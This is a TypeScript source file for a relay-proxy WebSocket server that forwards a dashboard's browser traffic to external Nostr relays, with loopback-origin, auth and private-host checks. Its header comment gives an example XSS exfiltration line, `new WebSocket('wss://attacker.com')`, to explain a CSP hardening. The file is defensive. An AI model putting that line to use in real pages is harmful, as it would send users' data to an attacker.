/**
 * Relay-proxy WebSocket — server-side bridge between browser code and
 * external Nostr relays.
 *
 * Why: the dashboard's CSP `connect-src` previously included `wss:` so
 * the browser could open `new WebSocket('wss://relay.damus.io')` directly
 * for stats counts and following-count lookups. That CSP token also lets
 * a future XSS payload exfil via `new WebSocket('wss://attacker.com')`.
 * Routing browser-originated WS through this proxy means the dashboard's
 * CSP can drop `wss:` entirely and only allow `ws://127.0.0.1:*` /
 * `ws://localhost:*` (our own loopback origin).
 *
 * URL: `/api/relay-proxy?u=<encoded-target>&token=<bearer>`
 *   - target MUST be wss:// (or ws:// to loopback for localhost relays)
 *   - target hostname is refused if isPrivateOrLoopbackHost — same
 *     posture as /api/img-proxy
 *   - same H1 (loopback Host) + H2 (loopback Origin) + auth gates as
 *     the terminal WS, modelled on src/lib/routes/terminal.ts
 *
 * Framing: 1:1 pass-through of NIP-01 JSON arrays. The proxy treats
 * messages as opaque bytes — does NOT parse REQ / EVENT / CLOSE. Apply
 * MAX_WS_PAYLOAD (1 MiB) to both legs.
 *
 * Out of scope: server-side relay queries in src/lib/nostr-query.ts,
 * src/lib/routes/identity.ts, src/lib/routes/ditto.ts,
 * src/lib/mail/inbox.ts — those never run in the browser and keep
 * their direct outbound WS.
 */
import http from 'http';
import { WebSocket, WebSocketServer } from 'ws';
import { getSession, localhostExempt } from '../auth.js';
import { MAX_WS_PAYLOAD } from '../ws-limits.js';

// Mirrors isPrivateOrLoopbackHost in nsite-resolver.ts and img-proxy.ts.
// Inlined to keep the proxy module self-contained.
function isPrivateOrLoopbackHost(host: string): boolean {
  if (!host) return false;
  const h = host.replace(/^\[|\]$/g, '').toLowerCase();
  if (h === '::1') return true;
  if (h === '::')  return true;
  if (h.startsWith('fe80:')) return true;
  if (h.startsWith('fc') || h.startsWith('fd')) return true;
  const m = h.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (m) {
    const [a, b] = [parseInt(m[1]), parseInt(m[2])];
    if (a === 127) return true;
    if (a === 10)  return true;
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 192 && b === 168) return true;
    if (a === 169 && b === 254) return true;
    if (a === 100 && b >= 64 && b <= 127) return true;
    if (a === 0)   return true;
  }
  return false;
}

interface TargetValidation {
  ok: boolean;
  url?: URL;
  error?: string;
}

function validateTarget(raw: string): TargetValidation {
  if (!raw) return { ok: false, error: 'u (target url) required' };
  let parsed: URL;
  try { parsed = new URL(raw); }
  catch { return { ok: false, error: 'invalid target url' }; }
  if (parsed.protocol !== 'wss:' && parsed.protocol !== 'ws:') {
    return { ok: false, error: 'only ws:// or wss:// targets allowed' };
  }
  if (isPrivateOrLoopbackHost(parsed.hostname)) {
    return { ok: false, error: 'private/loopback target refused' };
  }
  return { ok: true, url: parsed };
}

/**
 * Mounts the relay-proxy upgrade handler. Same closure-receiving shape
 * as mountTerminalWebSocket — needs the H1/H2 primitives bound to the
 * actual server port.
 */
export function mountRelayProxyWebSocket(
  server: http.Server,
  ctx: {
    allowedHosts: Set<string>;
    isLoopbackUrl: (u: string | undefined | null) => boolean;
  },
): void {
  const { allowedHosts, isLoopbackUrl } = ctx;
  const wss = new WebSocketServer({ noServer: true, maxPayload: MAX_WS_PAYLOAD });

  server.on('upgrade', (req, socket, head) => {
    const url = req.url || '';
    // Match path BEFORE query string. Anything not under /api/relay-proxy
    // is left for other upgrade handlers.
    const qIdx = url.indexOf('?');
    const pathOnly = qIdx >= 0 ? url.slice(0, qIdx) : url;
    if (pathOnly !== '/api/relay-proxy') return;

    // H1: loopback Host header.
    const hostHeader = String(req.headers['host'] || '').toLowerCase();
    if (!allowedHosts.has(hostHeader)) {
      socket.write('HTTP/1.1 400 Bad Request\r\n\r\n');
      socket.destroy();
      return;
    }
    // H2: loopback Origin (browsers always send Origin on upgrade).
    const wsOrigin = typeof req.headers.origin === 'string' ? req.headers.origin : '';
    if (!isLoopbackUrl(wsOrigin)) {
      socket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
      socket.destroy();
      return;
    }

    // Auth.
    let authed = localhostExempt(req);
    const qs = qIdx >= 0 ? new URLSearchParams(url.slice(qIdx + 1)) : new URLSearchParams();
    if (!authed) {
      const tok = qs.get('token') || '';
      if (tok && getSession(tok)) authed = true;
    }
    if (!authed) {
      socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
      socket.destroy();
      return;
    }

    // Target validation.
    const v = validateTarget(qs.get('u') || '');
    if (!v.ok || !v.url) {
      socket.write('HTTP/1.1 400 Bad Request\r\n\r\n');
      socket.destroy();
      return;
    }

    wss.handleUpgrade(req, socket, head, (clientWs) => {
      bridge(clientWs, v.url!);
    });
  });
}

function bridge(clientWs: WebSocket, target: URL): void {
  // Outbound to the real relay. Apply MAX_WS_PAYLOAD on this leg too so a
  // misbehaving relay can't stream multi-GiB frames into our event loop.
  let upstream: WebSocket;
  try {
    upstream = new WebSocket(target.toString(), { maxPayload: MAX_WS_PAYLOAD });
  } catch {
    try { clientWs.close(1011, 'proxy: upstream construct failed'); } catch {}
    return;
  }

  // Buffer client → proxy messages received before upstream OPEN. Real
  // browsers send the first REQ in the open handler, but a fast client
  // could fire before we got the upstream up.
  const pending: Array<string | Buffer> = [];
  let upstreamOpen = false;

  upstream.on('open', () => {
    upstreamOpen = true;
    for (const m of pending) {
      try { upstream.send(m); } catch {}
    }
    pending.length = 0;
  });

  // Upstream → client: pass-through. ws library delivers Buffer for
  // binary, string for text. NIP-01 is text; rebroadcast as-is.
  upstream.on('message', (data, isBinary) => {
    if (clientWs.readyState !== WebSocket.OPEN) return;
    try { clientWs.send(data as any, { binary: isBinary }); } catch {}
  });

  // Forward upstream close → client. NIP-01 doesn't define close codes
  // semantically, but preserving the upstream code helps debugging.
  upstream.on('close', (code, reason) => {
    try {
      // 1005 (no status) / 1006 (abnormal) aren't legal to send back as
      // explicit codes — normalize to 1000 / 1011.
      const safeCode = (code === 1005) ? 1000 : (code === 1006 ? 1011 : code);
      clientWs.close(safeCode, reason);
    } catch {
      try { clientWs.terminate(); } catch {}
    }
  });

  upstream.on('error', () => {
    // Don't surface the error message — it can leak target / network
    // details. The 1011 close is enough signal for the client.
    try { clientWs.close(1011, 'proxy: upstream error'); } catch {}
    try { upstream.terminate(); } catch {}
  });

  // Client → upstream.
  clientWs.on('message', (data, isBinary) => {
    const frame = isBinary ? (data as Buffer) : (data as Buffer).toString('utf8');
    if (!upstreamOpen) {
      pending.push(frame);
      return;
    }
    try { upstream.send(frame); } catch {}
  });

  clientWs.on('close', () => {
    try { upstream.close(); } catch {}
  });
  clientWs.on('error', () => {
    try { upstream.terminate(); } catch {}
  });
}
